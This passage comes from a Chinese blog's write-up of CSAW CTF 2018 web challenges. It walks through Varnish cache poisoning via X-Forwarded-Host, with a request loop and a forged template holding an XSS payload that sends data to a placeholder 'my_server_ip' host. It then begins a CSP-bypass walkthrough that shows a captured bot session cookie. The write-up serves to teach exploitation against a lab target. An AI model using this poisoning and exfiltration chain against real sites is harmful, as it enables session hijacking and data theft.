class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>除此之外，还发现了个<code>Report an issue</code>的功能</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537343210855.png" alt="1537343210855"></p><p>除此之外，还有这两个<code>js</code>，以下为<code>add.js</code>的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script data-src=&quot;app.js&quot; data-cdn=&quot;6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>内容为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="string">'/api/movies'</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()),</span><br><span class="line">    fetch(<span class="string">`//6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_recapcha === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_mustache === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="function">(<span class="params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: <span class="function"><span class="params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> hidden = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">true</span>;</span><br><span class="line">          hidden = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()).then(<span class="function"><span class="params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中还有<code>6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst</code>，下载看看，内容为下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"movies"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Year<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Length<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"captcha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"report"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"report"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上诉这些，其实都可以通过开发者工具一览究竟</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537345852973.png" alt="1537345852973"></p><p>在其中的<code>/api/report</code>发现了一些有趣的东西</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346702605.png" alt="1537346702605"></p><p>回显如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin&quot;:false,&quot;movies&quot;:[&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 54 Minutes&quot;,&quot;name&quot;:&quot;WarGames&quot;,&quot;year&quot;:1983&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;0 Hours, 31 Minutes&quot;,&quot;name&quot;:&quot;Kung Fury&quot;,&quot;year&quot;:2015&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;Sneakers&quot;,&quot;year&quot;:1992&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 39 Minutes&quot;,&quot;name&quot;:&quot;Swordfish&quot;,&quot;year&quot;:2001&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;The Karate Kid&quot;,&quot;year&quot;:1984&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 23 Minutes&quot;,&quot;name&quot;:&quot;Ghost in the Shell&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;5 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;Serial Experiments Lain&quot;,&quot;year&quot;:1998&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;The Matrix&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 57 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 43 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner 2049&quot;,&quot;year&quot;:2017&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 47 Minutes&quot;,&quot;name&quot;:&quot;Hackers&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 36 Minutes&quot;,&quot;name&quot;:&quot;TRON&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 5 Minutes&quot;,&quot;name&quot;:&quot;Tron: Legacy&quot;,&quot;year&quot;:2010&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 25 Minutes&quot;,&quot;name&quot;:&quot;Minority Report&quot;,&quot;year&quot;:2002&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 37 Minutes&quot;,&quot;name&quot;:&quot;eXistenZ&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018&#125;]&#125;</span><br></pre></td></tr></table></figure><p>可以看到最后一句<code>{&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018}]}</code>与之前的不同，猜测着里如果将<code>true</code>改成<code>flase</code>，那么<code>[REDACTED]</code>将是可见的，但是好像没用啊。做题的时候，也就只做到这里，后面看了大佬们的<code>writeup</code>才理解过来。</p><p>仔细查看每个响应头都有：<code>Via: 1.1 varnish-v4</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346973458.png" alt="1537346973458"></p><p>额，，下面直接引用大佬的<a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">writeup</a>。</p><p>了解了下<code>varnish</code>，发现它是一个<code>反向代理</code>中的<code>缓存服务</code>程序。</p><blockquote><p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p></blockquote><p>  varnish详细的请求头可以在<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" target="_blank" rel="noopener">这里</a>找到。</p><p>  所以这里我们需要用到一种叫<code>Web Cache Poisoning</code>（<code>web缓存污染</code>）的利用方法，这个跟<code>Cache Poisoning</code>（又称DNS污染）是不一样的东西。</p><p>  参考链接：</p><p>  <a href="https://xz.aliyun.com/t/2585" target="_blank" rel="noopener">中文版-实战Web缓存中毒</a></p><p>  <a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank" rel="noopener">英文原版</a></p><p>  这里我们可以重点关注<code>DOM Poisoning</code>（DOM污染）。</p><p>  另一个需要先了解的事情是<code>X-Forwarded-Host</code>的作用，详情可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank" rel="noopener">这里</a>。</p><blockquote><p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用 Host 指定的初始域名。 反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p></blockquote><p>  语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: &lt;host&gt;</span><br></pre></td></tr></table></figure><p>  上面这些归结起来就是<code>当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</code></p><p>  现在再回过头看看我们已有的资料。我们得知<code>main.mst</code>是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p><p>  我们先来找到<code>main.mst</code>缓存的最大时间(<code>max-age</code>)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p><p>  我们可以使用下面的脚本验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">X_Forwarded_Host = &apos;1.2.3.4&apos; </span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    resp = requests.get(&quot;http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js&quot;, headers=&#123;&apos;X-Forwarded-Host&apos;: X_Forwarded_Host&#125;)</span><br><span class="line">    print resp.headers</span><br><span class="line">    if X_Forwarded_Host in resp.text:</span><br><span class="line">        print resp.text</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537351113421.png" alt="1537351113421"></p><p>得到的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">var token = null;</span><br><span class="line"></span><br><span class="line">Promise.all([</span><br><span class="line">    fetch('/api/movies').then(r=&gt;r.json()),</span><br><span class="line">    fetch(`//1.2.3.4/cdn/main.mst`).then(r=&gt;r.text()),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_recapcha === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_mustache === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(([user, view])=&gt;&#123;</span><br><span class="line">    document.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(document.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: t=&gt; &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            document.getElementById(<span class="string">'report'</span>).disabled = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    let hidden = true;</span><br><span class="line">    document.getElementById('report').onclick = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          document.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          document.getElementById(<span class="string">'report'</span>).disabled = true;</span><br><span class="line">          hidden = false;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: JSON.stringify(&#123;token:token&#125;)</span><br><span class="line">        &#125;).then(r=&gt;r.json()).then(j=&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                // The admin <span class="keyword">is</span> on her way to check the page</span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>em~</p><p>然后通过<code>web缓存污染</code>劫持了模板文件。接着我们再构造好模板文件，然后让<code>admin</code>去访问就可以拿到<code>flag</code>了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line"></span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;fetch(&apos;http://my_server_ip/&apos;+&apos;&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>它要求服务器回应的头信息要包含<code>Access-Control-Allow-Origin</code>字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    # Python 3</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="keyword">as</span> test_orig</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    def test (*args):</span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">8000</span>)</span><br><span class="line">except ImportError: # Python 2</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="keyword">from</span> SimpleHTTPServer <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class CORSRequestHandler (SimpleHTTPRequestHandler):</span><br><span class="line">    def end_headers (self):</span><br><span class="line">        self.send_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure><p>开启后就能在日志输出中得到<code>flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}</code></p><h5 id="No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）"><a href="#No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）" class="headerlink" title="No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）"></a>No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）</h5><p><code>No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.</code></p><p><code>Be #unhackable.™</code></p><p><code>http://no.vulnerable.services/</code></p><p>此题没做出来，稍显复杂，先扔个<a href="https://ctftime.org/writeup/11205" target="_blank" rel="noopener">writeup</a>，然后复现一遍</p><p>首先用这个<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">CSP检测工具</a>检验CSP，检验结果如下图：</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365900771.png" alt="1537365900771"></p><p>发现<code>script-src</code>可能存在问题，但题目环境中我们并没有能够控制<code>src</code>的地方，所以再回头看看还有什么发现。</p><p>页面的最底下发现了一个奇怪的域名</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365952852.png" alt="1537365952852"></p><p>我们<code>ping</code>一下<code>no.vulnerable.services</code>发现解析地址是：<code>216.165.2.40</code>，16进制表示就是<code>0xd8a50228</code>。</p><p>由于CSP中存在<code>script-src *.no.vulnerable.services</code>，通过代理，我们可以绕过这一层。但是如何挂上代理呢？这里还有有一个点就是我们能提交网站内容供他们检查，他们会使用<code>bot</code>去模拟访问。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433319556.png" alt="1537433319556"></p><p>提交之后，得到了<code>cookie=PHPSESSID=9evknkhr4lfb2oii4h2k71ulac</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433181250.png" alt="1537433181250"></p><p>但是这里我尝试使用这里的cookie访问<code>http://admin.no.vulnerable.services</code>，都是需要账号和密码的，完全复现不出以下页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;NVS INTERNAL - Admin&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;Current Visitors: 672&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Quick links:&lt;/p&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;//support.no.vulnerable.services&quot;&gt;Support&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;lb.php&quot;&gt;Load Balancers - BETA&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>以下是我尝试的两个页面截图，第二个页面还是重定向到了<code>login.php</code>去了</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406529974.png" alt="1537406529974"></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406731871.png" alt="1537406731871"></p><p>下面这句话我没搞懂，是我太菜了？还请大佬们教教我</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433574609.png" alt="1537433574609"></p><p>额，假设我复现出以上页面，使用这个<code>cookie</code>的成功访问<code>http://admin.no.vulnerable.services</code>，我们将看到<code>admin.no.vulnerable.services/lb.php</code>与<code>support.no.vulnerable.services</code>。</p><p>查看其中<code>lb.php</code>，其实是一个负载均衡的监视器：</p><p><img 